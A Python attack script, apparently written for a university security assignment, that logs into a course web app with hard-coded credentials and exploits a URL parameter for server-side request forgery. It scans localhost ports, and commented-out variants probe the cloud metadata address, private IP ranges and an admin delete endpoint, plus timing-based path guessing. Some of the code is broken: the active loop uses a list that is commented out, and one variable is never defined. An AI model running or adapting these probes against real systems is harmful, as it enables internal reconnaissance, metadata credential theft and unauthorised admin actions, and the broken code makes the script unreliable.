import requests
import string
import time

#login auth payload
payload = {'user': 'katsuhidei', 'pass': 'katsuhidei'}
#login auth page
url_auth = 'http://assignment-hermes.unimelb.life/auth.php'
#url and ?username=
url_target = "http://assignment-hermes.unimelb.life/validate.php"

#query
query_no_admin = "http://127.0.0.1:{port}"
#query = "http://127.0.0.1:{port}/admin"
#query_address_no_admin = "http://assignment-hermes.unimelb.life:{port}"
#query_address = "http://assignment-hermes.unimelb.life:{port}/admin"
#query_aws_no_admin = "http://169.254.169.254:{port}"
#query_aws = "http://169.254.169.254:{port}/admin"
#query_encoded_no_admin = "http://127.0.0.1%3A{port}"
#query_encoded = "http://127.0.0.1%3A{port}%2Fadmin"
#query_aws_encoded_no_admin = ""
#query_aws_encoded = ""
#admin%2Fdelete%3Fusername%3Dhide
#admin/delete?username=something
#%2F = / , %3F = ? , %3D = = ,
#query_port_80 = "http://assignment-hermes.unimelb.life:80/{letter}"

#query_127_a = "http://127.0.0.1:{port}/admin"
#query_127_d = "http://127.0.0.1:{port}/dashboard.php"
#query_127_v = "http://127.0.0.1:{port}/validate.php"
#query_127_p = "http://127.0.0.1:{port}/profile.php"

#query_127_list = [query_127_d,query_127_v,query_127_p,query_127_a]


#query_192 = "http://192.0.0.{num}:{port}/admin"
#query_10 =  "http://10.0.0.{num}:{port}/admin"
#query_172 = "http://172.16.0.{num}:{port}/admin"

#query_192_no_port = "http://192.0.0.{num}/admin"
#query_10_no_port =  "http://10.0.0.{num}/admin"
#query_172_no_port = "http://172.16.0.{num}/admin"

#query list
#query_list = [query_192,query_10,query_172]

#query list wihtout port
#query_list_no_port = [query_192_no_port,query_10_no_port,query_172_no_port]

#port_list = [80,81,8080,8081]

#query_192_sub = "http://192.0.{sub}.{num}:{port}/admin"
#query_sub_list = [query_192_sub]

def makeRequest(url_target,query,s):

    #set parameters
    params = {"web": query}

    #make the request
    x = s.get(url = url_target,params = params)

    #remember response time
    time = x.elapsed.total_seconds()

    #content length
    content_length = int(x.headers['content-length'])

    #return the content of the response & response time
    return x.text, time, content_length

#login session
with requests.Session() as s:
    
    #get auth
    s.post(url_auth, data=payload)


#------------------------port scanning 127--------------------------

    #non_invalid = []
    for q in query_127_list:
        for port in range(9000):
            response = makeRequest(url_target,q.format(port=port),s)
            print(q.format(port=port))
            print("returned text is \"" + response[0] + "\"")
            #print("request elapsed time (second) is " + str(response[1]))
            #if response[0] != "Invalid Website provided" or response[0] != "Does this look correct to you?":
                #non_invalid.append(q.format(port=port))
            
            time.sleep(2)

    #print("non_invalid is :")
    #print(non_invalid)
    print("done!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    
#--------------------------query----------------------------------
    '''
    #meke the request
    non_invalid = []
    for q in query_list:
        for port in range(300):
            response = makeRequest(url_target,q.format(port=port),s)
            print(q.format(port=port))
            print("returned text is \"" + response[0] + "\"")
            #print("request elapsed time (second) is " + str(response[1]))
            if response[0] != "Invalid Website provided" or response[0] != "Does this look correct to you?":
                non_invalid.append(q.format(port=port))
            
            time.sleep(2)

    print(non_invalid)
    '''
#-------------------------az letter-------------------------------
    '''
    #meke the request
    letter = ""
    az_dict = dict.fromkeys(string.ascii_letters)# + string.digits + string.punctuation + string.whitespace
    for az in string.ascii_letters:# + string.digits + string.punctuation + string.whitespace:
        response = makeRequest(url_target,query_port_80.format(letter=letter+az),s)
        print("waiting... "+az)
        #print("returned text is \"" + response[0] + "\"")
        #print("request elapsed time (second) is " + str(response[1]))
        #if response[0] != "Invalid Website provided" or response[0] != "Does this look correct to you?":
        #    non_invalid.append(query_port_80.format(port=port))
        az_dict[az] = response[1]
        if az == 'Z' and response[0] != "Invalid Website provided":
            max_value = max(az_dict.values())
            max_keys = [k for k, v in az_dict.items() if v == max_value]
            letter = letter + max_keys[0]
            print('the max time letter is ' + max_keys[0])
            print("letter is " + letter)
        time.sleep(2)
    '''




#-------------------------ip scanning test--------------------------
    '''
    sus = []
    current_longest = {"length":0,"query":""}
    for q in query_list:
        for port in port_list:
            for num in range(1,255):
                response = makeRequest(url_target,q.format(num=num,port=port),s)
                print(q.format(num=num,port=port) + " " + str(response[2]))
                #print("the elapsed time is " + str(response[1]))
                if current_longest["length"] < response[2]:
                    current_longest["length"] = response[2]
                    current_longest["query"] = q.format(num=num,port=port)
                if response[0] != "Does this look correct to you?":
                    sus.append(q.format(num=num,port=port))
                    
                time.sleep(2)
    print("longest content is :")
    print(longest_content)
    print("suspicious query is :")
    print(sus)
    '''

#--------------ip scanning test without port------------------------------
    '''
    sus = []
    current_longest = {"length":0,"query":""}
    for q in query_list_no_port:
        for num in range(1,255):
            response = makeRequest(url_target,q.format(num=num),s)
            print(q.format(num=num) + " " + str(response[2]))
            #print("the elapsed time is " + str(response[1]))
            if current_longest["length"] < response[2]:
                current_longest["length"] = response[2]
                current_longest["query"] = q.format(num=num)
            if response[0] != "Does this look correct to you?":
                    sus.append(q.format(num=num,port=port))
            time.sleep(2)
    print(longest_content)
    print("longest content is :")
    print(longest_content)
    print("suspicious query is :")
    print(sus)
    '''
#---------------192 only-----------------------------------------------------
    '''
    sus = []
    current_longest = {"length":0,"query":""}
    for q in query_sub_list:
        for port in range(100):
            for sub in range(3):
                for num in range(256):
                    response = makeRequest(url_target,q.format(sub=sub,num=num,port=port),s)
                    print(q.format(sub=sub,num=num,port=port) + " " + str(response[2]))
                    #print("the elapsed time is " + str(response[1]))
                    if current_longest["length"] < response[2]:
                        current_longest["length"] = response[2]
                        current_longest["query"] = q.format(sub=sub,num=num,port=port)
                    if response[0] != "Does this look correct to you?":
                        sus.append(q.format(sub=sub,num=num,port=port))
                        
                    time.sleep(2)
    print("longest content is :")
    print(longest_content)
    print("suspicious query is :")
    print(sus)
    '''
